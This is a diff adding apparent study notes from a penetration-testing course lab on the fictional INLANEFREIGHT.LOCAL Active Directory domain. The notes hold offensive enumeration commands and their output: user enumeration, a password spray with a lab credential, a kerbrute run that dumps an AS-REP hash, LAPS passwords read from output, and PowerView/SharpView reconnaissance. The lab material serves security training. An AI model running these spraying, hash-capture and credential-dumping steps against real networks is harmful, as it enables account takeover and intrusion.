@@ -328,3 +328,688 @@ sudo responder -I ens224
 
 ```
 
+```
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+rpcclient -U "" -N 172.16.5.5
+crackmapexec smb 172.16.5.5 --users
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+```
+
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+```
+kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 01/23/25 - Ronnie Flathers @ropnop
+
+2025/01/23 09:20:52 >  Using KDC(s):
+2025/01/23 09:20:52 >   INLANEFREIGHT.LOCAL:88
+
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  jjones@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  sbrown@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwilson@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  tjohnson@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  bdavis@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  njohnson@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  asanchez@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  dlewis@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  ccruz@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf75b0e3e9e6a6618f056a759aea61af09da3bee3e07b0cd00c8b6c1602d20bef71dfacd85468aa32f60a4e27185023472f8b7367faa2c97adbb4c90bd6a413ec54917a62103bedd6049711716cec6a3363b1b6ab6c602aa0f429fbe7dfec1dfe0770c5d32bedff09ae139d64d9abb81b16b3b588b449d8f5d8a3e78556a8f14ccb841025f074ed49402414cb1834efef5fe21dfef361cd0f18946310aaa2c49c6090d54fe16f8afcf480dfe8416271bbee0cfbc03309b4539e2bf839e28d3841202751601c3ffb8616a1eb4acf42a07a69be3c6a15ddbf87bd9f5311100807ed61b84f385ea7d89c47bb0b35f5cd0f93d09c06b76bd2afb877a46c2ca983ba0fff17                                                                                     
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  mmorgan@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  rramirez@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwallace@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  jsantiago@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  gdavis@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  mrichardson@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  mharrison@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  tgarcia@INLANEFREIGHT
+2025/01/23 09:20:52 >  [+] VALID USERNAME:  jmay@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmontgomery@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  jhopkins@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  dpayne@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  mhicks@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  adunn@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  lmatthews@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  avazquez@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  mlowe@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmcdaniel@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  csteele@INLANEFREIGHT
+2025/01/23 09:20:53 >  [+] VALID USERNAME:  mmullins@INLANEFREIGHT
+2025/01/23 09:20:54 >  [+] VALID USERNAME:  mochoa@INLANEFREIGHT
+2025/01/23 09:20:54 >  [+] VALID USERNAME:  aslater@INLANEFREIGHT
+2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehoffman@INLANEFREIGHT
+2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehamilton@INLANEFREIGHT
+2025/01/23 09:20:54 >  [+] VALID USERNAME:  cpennington@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  srosario@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  lbradford@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  halvarez@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  gmccarthy@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  dbranch@INLANEFREIGHT
+2025/01/23 09:20:55 >  [+] VALID USERNAME:  mshoemaker@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  mholliday@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  ngriffith@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  sinman@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  minman@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  rhester@INLANEFREIGHT
+2025/01/23 09:20:56 >  [+] VALID USERNAME:  rburrows@INLANEFREIGHT
+2025/01/23 09:20:57 >  [+] VALID USERNAME:  dpalacios@INLANEFREIGHT
+2025/01/23 09:20:58 >  [+] VALID USERNAME:  strent@INLANEFREIGHT
+2025/01/23 09:20:58 >  [+] VALID USERNAME:  fanthony@INLANEFREIGHT
+2025/01/23 09:20:59 >  [+] VALID USERNAME:  evalentin@INLANEFREIGHT
+2025/01/23 09:20:59 >  [+] VALID USERNAME:  sgage@INLANEFREIGHT
+2025/01/23 09:20:59 >  [+] VALID USERNAME:  jshay@INLANEFREIGHT
+2025/01/23 09:21:00 >  [+] VALID USERNAME:  jhermann@INLANEFREIGHT
+2025/01/23 09:21:01 >  [+] VALID USERNAME:  whouse@INLANEFREIGHT
+2025/01/23 09:21:01 >  [+] VALID USERNAME:  emercer@INLANEFREIGHT
+2025/01/23 09:21:02 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT
+2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
+```
+```
+Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+```Checking the Status of Defender with Get-MpComputerStatus
+Enumerating Security Controls
+
+PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                 : 1.1.17400.5
+AMProductVersion                : 4.10.14393.0
+AMServiceEnabled                : True
+AMServiceVersion                : 4.10.14393.0
+AntispywareEnabled              : True
+AntispywareSignatureAge         : 1
+AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
+AntispywareSignatureVersion     : 1.323.392.0
+AntivirusEnabled                : True
+AntivirusSignatureAge           : 1
+AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
+AntivirusSignatureVersion       : 1.323.392.0
+BehaviorMonitorEnabled          : False
+ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
+ComputerState                   : 0
+FullScanAge                     : 4294967295
+FullScanEndTime                 :
+FullScanStartTime               :
+IoavProtectionEnabled           : False
+LastFullScanSource              : 0
+LastQuickScanSource             : 2
+NISEnabled                      : False
+NISEngineVersion                : 0.0.0.0
+NISSignatureAge                 : 4294967295
+NISSignatureLastUpdated         :
+NISSignatureVersion             : 0.0.0.0
+OnAccessProtectionEnabled       : False
+QuickScanAge                    : 0
+QuickScanEndTime                : 9/3/2020 12:50:45 AM
+QuickScanStartTime              : 9/3/2020 12:49:49 AM
+RealTimeProtectionEnabled       : True
+RealTimeScanDirection           : 0
+PSComputerName                  :
+```
+
+```
+Using Get-AppLockerPolicy cmdlet
+Enumerating Security Controls
+
+PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
+Name                : Block PowerShell
+Description         : Blocks Domain Users from using PowerShell on workstations
+UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
+Action              : Deny
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 921cc481-6e17-4653-8f75-050b80acca20
+Name                : (Default Rule) All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
+Name                : (Default Rule) All files
+Description         : Allows members of the local Administrators group to run all applications.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+```
+
+Enumerating Language Mode
+Enumerating Security Controls
+```
+PS C:\htb> $ExecutionContext.SessionState.LanguageMode
+
+ConstrainedLanguage
+```
+
+```
+Using Find-LAPSDelegatedGroups
+Enumerating Security Controls
+
+PS C:\htb> Find-LAPSDelegatedGroups
+
+OrgUnit                                             Delegated Groups
+-------                                             ----------------
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+```
+
+```Using Get-LAPSComputers
+Enumerating Security Controls
+
+PS C:\htb> Get-LAPSComputers
+
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
+EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
+SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
+WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
+```
+
+```
+rpcclient $> enumdomusers
+queryuser 0x492
+enumdomgroups
+querygroup 0xff0
+```
+
+```
+
+Get-Module
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
+
+
+Import-Module ActiveDirectory
+PS C:\htb> Get-Module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
+
+Get-ADDomain
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
+ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
+DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
+DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
+DNSRoot                            : INLANEFREIGHT.LOCAL
+DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
+Forest                             : INLANEFREIGHT.LOCAL
+InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
+                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
+                                     EFREIGHT,DC=LOCAL}
+LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
+ManagedBy                          :
+Name                               : INLANEFREIGHT
+NetBIOSName                        : INLANEFREIGHT
+ObjectClass                        : domainDNS
+ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
+ParentDomain                       :
+PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
+RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
+                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
+                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
+                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
+SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
+UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+```
+ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled              : True
+GivenName            : Sharepoint
+Name                 : adfs
+ObjectClass          : user
+ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
+SamAccountName       : adfs
+ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
+SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
+Surname              : Admin
+UserPrincipalName    :
+
+DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled              : True
+GivenName            : Jessica
+Name                 : BACKUPAGENT
+ObjectClass          : user
+ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
+SamAccountName       : backupagent
+ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
+SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
+Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
+UserPrincipalName    :
+
+<SNIP>
+```
+
+```
+ Get-ADTrust -Filter *
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : False
+IntraForest             : True
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 32
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : True
+IntraForest             : False
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : FREIGHTLOGISTICS.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : FREIGHTLOGISTICS.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 8
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+```
+
+```
+ Get-ADGroup -Filter * | select name
+
+name
+----
+Administrators
+Users
+Guests
+Print Operators
+Backup Operators
+Replicator
+Remote Desktop Users
+Network Configuration Operators
+Performance Monitor Users
+Performance Log Users
+Distributed COM Users
+IIS_IUSRS
+Cryptographic Operators
+Event Log Readers
+Certificate Service DCOM Access
+RDS Remote Access Servers
+RDS Endpoint Servers
+RDS Management Servers
+Hyper-V Administrators
+Access Control Assistance Operators
+Remote Management Users
+Storage Replica Administrators
+Domain Computers
+Domain Controllers
+Schema Admins
+Enterprise Admins
+Cert Publishers
+Domain Admins
+
+<SNIP>
+```
+
+```
+Get-ADGroup -Identity "Backup Operators"
+
+DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+GroupCategory     : Security
+GroupScope        : DomainLocal
+Name              : Backup Operators
+ObjectClass       : group
+ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
+SamAccountName    : Backup Operators
+SID               : S-1-5-32-551
+```
+
+```
+Get-ADGroupMember -Identity "Backup Operators"
+
+distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+name              : BACKUPAGENT
+objectClass       : user
+objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
+SamAccountName    : backupagent
+SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
+```
+
+PowerView
+
+PowerView is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.
+
+Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.
+Command 	Description
+Export-PowerViewCSV 	Append results to a CSV file
+ConvertTo-SID 	Convert a User or group name to its SID value
+Get-DomainSPNTicket 	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
+Domain/LDAP Functions: 	
+Get-Domain 	Will return the AD object for the current (or specified) domain
+Get-DomainController 	Return a list of the Domain Controllers for the specified domain
+Get-DomainUser 	Will return all users or specific user objects in AD
+Get-DomainComputer 	Will return all computers or specific computer objects in AD
+Get-DomainGroup 	Will return all groups or specific group objects in AD
+Get-DomainOU 	Search for all or specific OU objects in AD
+Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
+Get-DomainGroupMember 	Will return the members of a specific domain group
+Get-DomainFileServer 	Returns a list of servers likely functioning as file servers
+Get-DomainDFSShare 	Returns a list of all distributed file systems for the current (or specified) domain
+GPO Functions: 	
+Get-DomainGPO 	Will return all GPOs or specific GPO objects in AD
+Get-DomainPolicy 	Returns the default domain policy or the domain controller policy for the current domain
+Computer Enumeration Functions: 	
+Get-NetLocalGroup 	Enumerates local groups on the local or a remote machine
+Get-NetLocalGroupMember 	Enumerates members of a specific local group
+Get-NetShare 	Returns open shares on the local (or a remote) machine
+Get-NetSession 	Will return session information for the local (or a remote) machine
+Test-AdminAccess 	Tests if the current user has administrative access to the local (or a remote) machine
+Threaded 'Meta'-Functions: 	
+Find-DomainUserLocation 	Finds machines where specific users are logged in
+Find-DomainShare 	Finds reachable shares on domain machines
+Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
+Find-LocalAdminAccess 	Find machines on the local domain where the current user has local administrator access
+Domain Trust Functions: 	
+Get-DomainTrust 	Returns domain trusts for the current domain or a specified domain
+Get-ForestTrust 	Returns all forest trusts for the current forest or a specified forest
+Get-DomainForeignUser 	Enumerates users who are in groups outside of the user's domain
+Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
+Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any others seen.
+
+```
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+name                 : Matthew Morgan
+samaccountname       : mmorgan
+description          :
+memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
+                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
+                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
+                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+whencreated          : 10/27/2021 5:37:06 PM
+pwdlastset           : 11/18/2021 10:02:57 AM
+lastlogontimestamp   : 2/27/2022 6:34:25 PM
+accountexpires       : NEVER
+admincount           : 1
+userprincipalname    : mmorgan@inlanefreight.local
+serviceprincipalname :
+mail                 :
+useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+```
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+GroupDomain             : INLANEFREIGHT.LOCAL
+GroupName               : Domain Admins
+GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+MemberDomain            : INLANEFREIGHT.LOCAL
+MemberName              : svc_qualys
+MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613
+
+GroupDomain             : INLANEFREIGHT.LOCAL
+GroupName               : Domain Admins
+GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+MemberDomain            : INLANEFREIGHT.LOCAL
+MemberName              : sp-admin
+MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228
+
+GroupDomain             : INLANEFREIGHT.LOCAL
+GroupName               : Secadmins
+GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+MemberDomain            : INLANEFREIGHT.LOCAL
+MemberName              : spong1990
+MemberDistinguishedName : CN=Maggie
+                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965
+
+<SNIP>
+```
+
+```
+Get-DomainTrustMapping
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+
+SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+```
+
+```
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+ComputerName    IsAdmin
+------------    -------
+ACADEMY-EA-MS01    True
+```
+
+```
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+serviceprincipalname                          samaccountname
+--------------------                          --------------
+adfsconnect/azure01.inlanefreight.local       adfs
+backupjob/veam001.inlanefreight.local         backupagent
+d0wngrade/kerberoast.inlanefreight.local      d0wngrade
+kadmin/changepw                               krbtgt
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
+MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
+sts/inlanefreight.local                       solarwindsmonitor
+testspn/kerberoast.inlanefreight.local        testspn
+testspn2/kerberoast.inlanefreight.local       testspn2
+```
+
+```
+ .\SharpView.exe Get-DomainUser -Help
+
+Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>
+```
+
+```
+PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
+
+[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
+objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
+samaccounttype                 : USER_OBJECT
+objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
+useraccountcontrol             : NORMAL_ACCOUNT
+accountexpires                 : 12/31/1600 4:00:00 PM
+lastlogon                      : 4/18/2022 1:01:21 PM
+lastlogontimestamp             : 4/9/2022 1:33:21 PM
+pwdlastset                     : 2/28/2022 12:03:45 PM
+lastlogoff                     : 12/31/1600 4:00:00 PM
+badPasswordTime                : 4/5/2022 7:09:07 AM
+name                           : forend
